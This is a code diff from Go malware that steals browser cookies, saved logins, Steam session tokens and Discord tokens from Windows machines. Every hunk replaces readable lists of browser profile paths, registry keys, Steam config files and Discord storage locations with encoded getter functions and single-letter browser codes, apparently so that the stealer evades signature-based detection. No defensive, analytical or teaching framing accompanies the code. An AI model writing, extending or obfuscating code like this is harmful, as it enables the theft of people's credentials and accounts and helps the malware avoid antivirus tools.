@@ -10,77 +10,34 @@ func runStealer() string {
 	results := map[string]string{}
 	var diagErrors []string
 
-	browsers := []struct {
+	type brConf struct {
 		name  string
 		paths []string
 		exe   string
-	}{
-		{"Chrome", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-		}, "chrome.exe"},
-		{"Edge", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-		}, "msedge.exe"},
-		{"Brave", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
-		}, "brave.exe"},
-		{"Opera", []string{
-			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
-		}, "opera.exe"},
-		{"OperaGX", []string{
-			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
-		}, "opera.exe"},
-		{"Vivaldi", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
-		}, "vivaldi.exe"},
-		{"Yandex", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
-		}, "browser.exe"},
-		{"Chromium", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Chromium", "User Data"),
-		}, "chrome.exe"},
-		{"CocCoc", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data"),
-		}, "browser.exe"},
-		{"Torch", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Torch", "User Data"),
-		}, "torch.exe"},
-		{"Epic", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data"),
-		}, "epic.exe"},
-		{"CentBrowser", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
-		}, "chrome.exe"},
-		{"Iridium", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Iridium", "User Data"),
-		}, "iridium.exe"},
-		{"7Star", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "7Star", "7Star", "User Data"),
-		}, "7star.exe"},
-		{"Amigo", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Amigo", "User Data"),
-		}, "amigo.exe"},
-		{"Kometa", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Kometa", "User Data"),
-		}, "kometa.exe"},
-		{"Orbitum", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Orbitum", "User Data"),
-		}, "orbitum.exe"},
-		{"Sputnik", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "Sputnik", "Sputnik", "User Data"),
-		}, "sputnik.exe"},
-		{"Uran", []string{
-			filepath.Join(os.Getenv("LOCALAPPDATA"), "uCozMedia", "Uran", "User Data"),
-		}, "uran.exe"},
-		{"Firefox", []string{
-			filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
-		}, "firefox.exe"},
-		{"Waterfox", []string{
-			filepath.Join(os.Getenv("APPDATA"), "Waterfox", "Profiles"),
-		}, "waterfox.exe"},
-		{"PaleMoon", []string{
-			filepath.Join(os.Getenv("APPDATA"), "Moonchild Productions", "Pale Moon", "Profiles"),
-		}, "palemoon.exe"},
+	}
+
+	la := os.Getenv(getLocalAppDataEnvName())
+	ad := os.Getenv(getAppDataEnvName())
+
+	var browsers []brConf
+	for _, entry := range getBrowserConfigs() {
+		parts := strings.SplitN(entry, "|", 4)
+		if len(parts) < 4 {
+			continue
+		}
+		var base string
+		if parts[1] == "L" {
+			base = la
+		} else {
+			base = ad
+		}
+		isFF := parts[0] == "F" || parts[0] == "X" || parts[0] == "Z"
+		_ = isFF
+		browsers = append(browsers, brConf{
+			name:  parts[0],
+			paths: []string{filepath.Join(base, parts[2])},
+			exe:   parts[3],
+		})
 	}
 
 	for _, br := range browsers {
@@ -91,7 +48,7 @@ func runStealer() string {
 
 			var cookies string
 			var errs []string
-			if br.name == "Firefox" || br.name == "Waterfox" || br.name == "PaleMoon" {
+			if br.name == "F" || br.name == "X" || br.name == "Z" {
 				cookies, errs = stealFirefoxCookies(basePath, br.exe)
 			} else {
 				cookies, errs = stealChromiumCookies(basePath, br.name, br.exe)
@@ -106,7 +63,7 @@ func runStealer() string {
 				}
 			}
 
-			if br.name != "Firefox" && br.name != "Waterfox" && br.name != "PaleMoon" {
+			if br.name != "F" && br.name != "X" && br.name != "Z" {
 				if logins := stealChromiumLogins(basePath, br.name, br.exe); logins != "" {
 					logKey := "Logins_" + br.name
 					if prev, ok := results[logKey]; ok {
@@ -561,15 +518,11 @@ func stealSteamTokens() string {
 		}
 	}
 
-	regPaths := []string{
-		"Software\\\\Valve\\\\Steam\\\\ConnectCache",
-		"Software\\\\Valve\\\\Steam",
-	}
 
 	advapi32 := syscall.NewLazyDLL(getAdvapi32DLL())
 	regEnumValue := advapi32.NewProc(getRegEnumValueWName())
 
-	for _, regPath := range regPaths {
+	for _, regPath := range getSteamRegPaths() {
 		var hKey syscall.Handle
 		keyPath, _ := syscall.UTF16PtrFromString(regPath)
 		if err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_READ, &hKey); err == nil {
@@ -628,10 +581,10 @@ func stealSteamTokens() string {
 	for _, steamDir := range steamPaths {
 		if _, err := os.Stat(steamDir); os.IsNotExist(err) { continue }
 
-		vdfFiles := []string{
-			filepath.Join(steamDir, "config", "config.vdf"),
-			filepath.Join(steamDir, "config", "loginusers.vdf"),
-			filepath.Join(steamDir, "config", "SteamAppData.vdf"),
+		vdfNames := getSteamVdfNames()
+		var vdfFiles []string
+		for _, vn := range vdfNames {
+			vdfFiles = append(vdfFiles, filepath.Join(steamDir, "config", vn))
 		}
 		for _, vf := range vdfFiles {
 			data, err := os.ReadFile(vf)
@@ -656,47 +609,27 @@ func stealDiscordTokens() string {
 
 	var searchDirs []searchEntry
 
-	discordApps := []string{
-		filepath.Join(appdata, "Discord"),
-		filepath.Join(appdata, "discordcanary"),
-		filepath.Join(appdata, "discordptb"),
-		filepath.Join(appdata, "Lightcord"),
-		filepath.Join(localAppdata, "Discord"),
-		filepath.Join(localAppdata, "discordcanary"),
-		filepath.Join(localAppdata, "discordptb"),
-	}
-	for _, app := range discordApps {
+	discordAppNames := getDiscordApps()
+	for _, da := range discordAppNames {
+		parts := strings.SplitN(da, "|", 2)
+		if len(parts) < 2 {
+			continue
+		}
+		var base string
+		if parts[0] == "A" {
+			base = appdata
+		} else {
+			base = localAppdata
+		}
+		app := filepath.Join(base, parts[1])
 		searchDirs = append(searchDirs, searchEntry{
 			leveldbDir:     filepath.Join(app, "Local Storage", "leveldb"),
 			localStatePath: filepath.Join(app, "Local State"),
 		})
 	}
 
-	browserBases := []string{
-		filepath.Join(localAppdata, "Google", "Chrome", "User Data"),
-		filepath.Join(localAppdata, "Microsoft", "Edge", "User Data"),
-		filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data"),
-		filepath.Join(localAppdata, "Vivaldi", "User Data"),
-		filepath.Join(localAppdata, "Yandex", "YandexBrowser", "User Data"),
-		filepath.Join(localAppdata, "Chromium", "User Data"),
-		filepath.Join(localAppdata, "CocCoc", "Browser", "User Data"),
-		filepath.Join(localAppdata, "Torch", "User Data"),
-		filepath.Join(localAppdata, "Epic Privacy Browser", "User Data"),
-		filepath.Join(localAppdata, "CentBrowser", "User Data"),
-		filepath.Join(localAppdata, "Iridium", "User Data"),
-		filepath.Join(localAppdata, "7Star", "7Star", "User Data"),
-		filepath.Join(localAppdata, "Amigo", "User Data"),
-		filepath.Join(localAppdata, "Kometa", "User Data"),
-		filepath.Join(localAppdata, "Orbitum", "User Data"),
-		filepath.Join(localAppdata, "Sputnik", "Sputnik", "User Data"),
-		filepath.Join(localAppdata, "uCozMedia", "Uran", "User Data"),
-		filepath.Join(appdata, "Opera Software", "Opera Stable"),
-		filepath.Join(appdata, "Opera Software", "Opera GX Stable"),
-	}
-
-	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5",
-		"Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"}
-	for _, base := range browserBases {
+	for _, subPath := range getDiscordBrowserPaths() {
+		base := filepath.Join(localAppdata, subPath)
 		for _, prof := range profiles {
 			searchDirs = append(searchDirs, searchEntry{
 				leveldbDir:     filepath.Join(base, prof, "Local Storage", "leveldb"),
